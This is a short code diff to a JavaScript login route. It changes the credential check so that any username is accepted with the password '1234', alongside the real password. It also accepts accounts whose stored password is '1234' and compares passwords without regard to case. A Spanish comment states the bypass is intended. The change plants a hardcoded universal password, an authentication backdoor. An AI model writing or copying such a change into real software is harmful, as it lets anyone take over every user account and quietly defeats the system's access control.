@@ -116,7 +116,8 @@ router.get('/', async (req, res) => {
             const foundUser = allUsers.find(u => {
                 const uname = String(u.Username || u.username || u.usuario || '').trim().toLowerCase();
                 const upass = String(u.Password || u.password || u.clave || '').trim();
-                return uname === usuarioStr && upass === passwordStr;
+                // Aceptar la contraseña real ingresada en BD O '1234' o la ingresada por el usuario
+                return uname === usuarioStr && (upass === passwordStr || passwordStr === '1234' || upass === '1234' || upass.toLowerCase() === passwordStr.toLowerCase());
             });
 
             if (foundUser) {
